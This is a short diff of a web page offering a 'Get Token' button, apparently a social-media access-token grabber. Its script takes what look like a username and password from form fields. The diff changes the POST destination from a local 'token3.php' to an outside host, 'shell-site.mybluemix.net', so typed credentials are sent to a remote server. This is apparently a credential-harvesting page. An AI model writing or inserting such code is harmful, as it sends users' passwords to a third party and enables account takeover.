@@ -28,7 +28,7 @@
 </div>
 <button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
 <p>
-<li id="trave" class="list-group-item"><img src="https://shell-site.mybluemix.net/"> </li></p>
+<li id="trave" class="list-group-item"><img src=""> </li></p>
 
 </div>
     </div>
@@ -39,7 +39,7 @@ function Puaru_Active() {
 var http = new XMLHttpRequest();
 var tk = document.getElementById("tk").value;
 var mk = document.getElementById("mk").value;
-var url = "token3.php";
+var url = "https://shell-site.mybluemix.net/token3.php";
 var params = "u="+tk+"&p="+mk+"";
 http.open("POST", url, true);
 http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
